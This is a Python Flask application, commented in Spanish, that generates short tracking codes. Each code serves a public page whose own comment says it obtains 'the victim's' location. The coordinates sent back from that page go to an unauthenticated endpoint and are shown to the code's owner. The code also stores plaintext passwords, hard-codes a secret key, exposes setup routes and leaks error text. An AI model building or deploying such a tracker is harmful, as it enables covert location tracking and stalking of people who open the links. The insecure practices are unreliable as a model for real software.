from flask import Flask, render_template, request, redirect, url_for, jsonify
from flask_sqlalchemy import SQLAlchemy
from flask_login import LoginManager, login_user, logout_user, login_required, current_user, UserMixin
import random
import string
import os

# Inicializa Flask
app = Flask(__name__)
app.secret_key = 'tu_clave_secreta'

# Configuración de la base de datos
db_url = os.environ.get("DATABASE_URL")

if not db_url:
    raise ValueError("La variable DATABASE_URL no está definida")

if db_url.startswith("postgres://"):
    db_url = db_url.replace("postgres://", "postgresql://", 1)

app.config['SQLALCHEMY_DATABASE_URI'] = db_url
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

# Inicializa SQLAlchemy
db = SQLAlchemy(app)

# Importa modelos después de inicializar db
from models import Usuario, Dispositivo

# Configura Flask-Login
login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = 'login'

@login_manager.user_loader
def load_user(user_id):
    return Usuario.query.get(int(user_id))

# Ruta raíz → redirige al login
@app.route('/')
def home():
    return redirect(url_for('login'))

# Ruta temporal: Crea todas las tablas manualmente
@app.route('/crear-tablas')
def crear_tablas():
    try:
        db.create_all()
        return "Tablas creadas exitosamente"
    except Exception as e:
        app.logger.error(f"Error al crear tablas: {e}")
        return f"Error al crear tablas: {str(e)}", 500

# Ruta temporal: Verifica conexión a la base de datos
@app.route('/test-db')
def test_db():
    try:
        db.session.execute('SELECT 1')
        return "Conexión exitosa a la base de datos"
    except Exception as e:
        return f"Error de conexión: {str(e)}", 500

# Registro de nuevos usuarios
@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        try:
            nombre = request.form.get('nombre')
            password = request.form.get('password')

            if not nombre or not password:
                return "Faltan credenciales", 400

            usuario_existente = Usuario.query.filter_by(nombre=nombre).first()
            if usuario_existente:
                return "Nombre de usuario ya existe", 409

            nuevo_usuario = Usuario(nombre=nombre, password=password)
            db.session.add(nuevo_usuario)
            db.session.commit()

            return redirect(url_for('login'))

        except Exception as e:
            db.session.rollback()
            app.logger.error(f"Error en /register: {e}")
            return f"Ocurrió un error interno: {str(e)}", 500

    return render_template('register.html')

# Inicio de sesión
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        nombre = request.form.get('nombre')
        password = request.form.get('password')

        if not nombre or not password:
            return "Faltan credenciales", 400

        usuario = Usuario.query.filter_by(nombre=nombre).first()

        if usuario and usuario.password == password:
            login_user(usuario)
            return redirect(url_for('dashboard'))

        return "Credenciales incorrectas", 401

    return render_template('login.html')

# Cierre de sesión
@app.route('/logout')
@login_required
def logout():
    logout_user()
    return redirect(url_for('login'))

# Dashboard del profesor
@app.route('/dashboard')
@login_required
def dashboard():
    return render_template('dashboard.html', usuario=current_user)

# Generar dispositivo único
@app.route('/registrar-dispositivo', methods=['POST'])
@login_required
def registrar_dispositivo():
    alias = request.form.get('alias')
    codigo = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    nuevo = Dispositivo(codigo=codigo, alias=alias, usuario_id=current_user.id)
    db.session.add(nuevo)
    db.session.commit()
    return jsonify({'codigo': codigo})

# Página que obtiene la ubicación de la víctima
@app.route('/<string:codigo>')
def mostrar_pagina(codigo):
    dispositivo = Dispositivo.query.filter_by(codigo=codigo).first()
    if not dispositivo:
        return "Código inválido", 404
    return render_template('index.html', codigo=codigo)

# Actualizar ubicación del dispositivo
@app.route('/actualizar', methods=['POST'])
def actualizar_ubicacion():
    codigo = request.form.get('codigo')
    lat = request.form.get('latitud')
    lon = request.form.get('longitud')
    precision = request.form.get('precision')

    dispositivo = Dispositivo.query.filter_by(codigo=codigo).first()

    if dispositivo and lat and lon:
        dispositivo.lat = float(lat)
        dispositivo.lon = float(lon)
        dispositivo.precision = float(precision) if precision else None
        db.session.commit()
        return jsonify({'status': 'ok'})

    return jsonify({'status': 'error'}), 400

# API REST para obtener ubicaciones del usuario actual
@app.route('/api/ubicaciones')
@login_required
def api_ubicaciones():
    dispositivos = Dispositivo.query.filter_by(usuario_id=current_user.id).all()
    data = {}

    for d in dispositivos:
        if d.lat and d.lon:
            data[d.codigo] = {
                'lat': d.lat,
                'lon': d.lon,
                'precision': d.precision,
                'alias': d.alias
            }

    return jsonify(data)

# Evita errores por favicon.ico
@app.route('/favicon.ico')
def favicon():
    return "", 200

# Iniciar servidor localmente (solo desarrollo)
if __name__ == '__main__':
    port = int(os.environ.get("PORT", 8000))
    app.run(host='0.0.0.0', port=port)